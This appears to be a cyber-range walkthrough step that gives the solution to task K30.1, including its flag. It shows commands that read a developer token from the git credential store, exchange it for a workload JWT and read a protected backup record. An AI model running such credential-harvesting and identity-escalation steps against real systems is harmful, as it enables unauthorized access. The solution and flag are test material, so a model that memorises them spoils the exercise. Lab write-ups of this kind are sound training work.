# K30.1 Walkthrough: Authority over the backup

The recovery build record `BLD-REC-021` (named in the K09.1 run log) grants backup
authority. cloud-api accepts the earned workload identity from K13.4 for this read.

## Step 0

```
gcloud compute ssh cinder-rs2-keplerops --project prod-mgau4w --zone us-central1-a --tunnel-through-iap
sudo docker exec -it --user rowan cinder-keplerops-k-dev bash
```

## Step 1: get the workload token (K13.4)

The developer token is per range; read it from the git credential store. The POST
mints the real K3s JWT for `svc-fieldlink-workload` (the token K13.4 produces).

```
CA=~/.local/share/keplerops/ca.crt
DEV=$(sed -E 's#https://([^@]+)@.*#\1#' ~/.config/git/credentials)
WORKLOAD=$(curl -sS --cacert $CA -u "$DEV" \
  -H 'Content-Type: application/json' -d '{}' \
  https://cloud-api.keplerops.test/api/workspaces/current/token-exchange \
  | grep -o '"access_token":"[^"]*"' | cut -d'"' -f4)
```

`$WORKLOAD` is a K3s JWT (starts with `eyJ`).

## Step 2: read the recovery build record (K30.1 acceptance check)

cloud-api accepts the earned workload identity (K13.4) or the release-reader token
(K09.4) for this record. The developer token alone is denied.

```
curl -sS --cacert $CA \
  -H "Authorization: Bearer $WORKLOAD" \
  https://cloud-api.keplerops.test/api/build-records/BLD-REC-021
```

Output: `{"allowed":"restore","backup":"BAK-2026-021","build_id":"BLD-REC-021","classification":"history-recovery","flag":"FLAG{c8bcc391ce763872}","principal":"svc-history-recovery","schema":"fieldkest.build-record/v1","session":"...","source_database":"denied"}`

Values used next: `backup=BAK-2026-021`, recovery `session` (K30.2).

Gate: the plain developer token is denied with `earned_workload_identity_required`;
the earned K13.4 workload identity or the K09.4 release-reader token is required.
